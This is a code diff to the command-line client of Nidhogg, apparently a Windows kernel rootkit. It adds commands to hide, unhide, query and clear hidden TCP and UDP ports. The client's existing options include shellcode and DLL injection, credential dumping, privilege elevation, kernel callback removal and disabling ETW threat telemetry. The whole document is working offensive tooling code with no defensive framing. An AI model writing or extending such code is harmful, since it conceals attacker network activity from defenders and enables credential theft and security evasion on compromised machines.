@@ -6,7 +6,8 @@
 
 enum class Options {
 	Unknown,
-	Add, Remove, Clear, Hide, Unhide, Elevate, Signature, Query, Write, Read, Patch, InjectShellcode, InjectDll, DumpCredentials
+	Add, Remove, Clear, Hide, Unhide, Elevate, Signature, Query, Write, Read, Patch, InjectShellcode, InjectDll,
+	DumpCredentials
 };
 
 #define PRINT_ASCII_ART
@@ -54,6 +55,7 @@ void PrintUsage() {
 	std::cout << "\tNidhoggClient.exe callbacks [query | remove | restore] [callback type] [callback address]" << std::endl;
 	std::cout << "\tNidhoggClient.exe etwti [enable | disable]" << std::endl;
 	std::cout << "\tNidhoggClient.exe dump_creds" << std::endl;
+	std::cout << "\tNidhoggClient.exe port [hide | unhide | query | clear] [port number] [tcp/udp] [remote/local]" << std::endl;
 }
 
 std::vector<byte> ConvertToVector(std::wstring rawPatch) {
@@ -270,6 +272,9 @@ int wmain(int argc, const wchar_t* argv[]) {
 		else if (_wcsicmp(argv[1], L"reg") == 0) {
 			success = nidhoggInterface.RegistryClearAll();
 		}
+		else if (_wcsicmp(argv[1], L"port") == 0) {
+			success = nidhoggInterface.ClearHiddenPorts();
+		}
 		else {
 			success = NIDHOGG_INVALID_OPTION;
 		}
@@ -300,6 +305,39 @@ int wmain(int argc, const wchar_t* argv[]) {
 				success = nidhoggInterface.RegistryHideKey(_wcsdup(argv[3]));
 			}
 		}
+		else if (_wcsicmp(argv[1], L"port") == 0) {
+			PortType portType;
+			USHORT port = 0;
+			bool remote = true;
+
+			if (argc != 6) {
+				success = NIDHOGG_INVALID_INPUT;
+				break;
+			}
+
+			if (_wcsicmp(argv[4], L"tcp") == 0) {
+				portType = PortType::TCP;
+
+				if (_wcsicmp(argv[5], L"remote") == 0)
+					remote = true;
+				else if (_wcsicmp(argv[5], L"local") == 0)
+					remote = false;
+				else {
+					success = NIDHOGG_INVALID_INPUT;
+					break;
+				}
+			}
+			else if (_wcsicmp(argv[4], L"udp") == 0)
+				portType = PortType::UDP;
+			else {
+				success = NIDHOGG_INVALID_INPUT;
+				break;
+			}
+
+			port = (USHORT)_wtoi(argv[3]);
+
+			success = nidhoggInterface.HidePort(port, portType, remote);
+		}
 		else {
 			success = NIDHOGG_INVALID_OPTION;
 		}
@@ -328,6 +366,39 @@ int wmain(int argc, const wchar_t* argv[]) {
 		else if (_wcsicmp(argv[1], L"driver") == 0) {
 			if (argc == 4)
 				success = nidhoggInterface.UnhideDriver(_wcsdup(argv[3]));
+		}
+		else if (_wcsicmp(argv[1], L"port") == 0) {
+			PortType portType;
+			USHORT port = 0;
+			bool remote = true;
+
+			if (argc != 6) {
+				success = NIDHOGG_INVALID_INPUT;
+				break;
+			}
+
+			if (_wcsicmp(argv[4], L"tcp") == 0) {
+				portType = PortType::TCP;
+
+				if (_wcsicmp(argv[5], L"remote") == 0)
+					remote = true;
+				else if (_wcsicmp(argv[5], L"local") == 0)
+					remote = false;
+				else {
+					success = NIDHOGG_INVALID_INPUT;
+					break;
+				}
+			}
+			else if (_wcsicmp(argv[4], L"udp") == 0)
+				portType = PortType::UDP;
+			else {
+				success = NIDHOGG_INVALID_INPUT;
+				break;
+			}
+
+			port = (USHORT)_wtoi(argv[3]);
+
+			success = nidhoggInterface.UnhidePort(port, portType, remote);
 		}
 		else {
 			success = NIDHOGG_INVALID_OPTION;
@@ -579,6 +650,29 @@ int wmain(int argc, const wchar_t* argv[]) {
 					}
 				}
 			}
+		}
+
+		else if (_wcsicmp(argv[1], L"port") == 0) {
+			std::wstring remote = L"";
+			std::wstring strType = L"";
+			std::vector<HiddenPort> result = nidhoggInterface.QueryHiddenPorts();
+
+			if (result.empty()) {
+				success = nidhoggInterface.GetNidhoggLastError();
+				break;
+			}
+
+			std::cout << "[ + ] Hidden ports:" << std::endl;
+
+			for (int i = 0; i < result.size(); i++) {
+				remote = result[i].Remote ? L"(Remote)" : L"(Local)";
+				strType = result[i].Type == PortType::TCP ? L"TCP" : L"UDP";
+				std::wcout << "\tPort number: " << result[i].Port << L" " << remote << std::endl;
+				std::wcout << "\tType: " << strType << std::endl;
+			}
+
+			success = NIDHOGG_SUCCESS;
+			break;
 		}
 
 		else {
